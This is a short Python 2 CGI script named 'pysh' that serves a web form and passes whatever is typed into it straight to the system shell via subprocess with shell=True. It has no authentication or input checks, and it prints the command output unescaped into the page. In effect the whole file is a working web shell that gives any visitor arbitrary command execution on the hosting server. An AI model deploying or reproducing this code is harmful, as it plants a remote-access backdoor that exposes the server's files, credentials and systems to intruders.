#!/usr/bin/env python

import cgi, shlex
import cgitb; cgitb.enable()  # for troubleshooting

import subprocess, os

print "Content-type: text/html"
print

print """
<html>

<head><title>pysh</title></head>

<body>
"""

form = cgi.FieldStorage()
command = form.getvalue("command", "")
pwd = form.getvalue("pwd", "")
output = ""
print pwd

if pwd == "":
  pwd = os.getcwd()

os.chdir(pwd)
if (len(command.split()) > 0):
  if command.split()[0] == "cd":
    os.chdir(pwd + "/" + command.split()[1])
    output = os.getcwd()
  else:
    p = subprocess.Popen(command, shell = True,  stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = p.stdout.readlines()
    p.stdout.close()
  
pwd = os.getcwd()


print """
  <pre>$ %s</pre>
  <div> 
    <form>
      <p>$ <input type="text" name="command"/></p>
      <p>$cwd <input value="%s" type="hidden" name="pwd"/></p>
    </form>
  </div>

</body>

</html>
""" % (output, pwd)

#shlex.split(command)

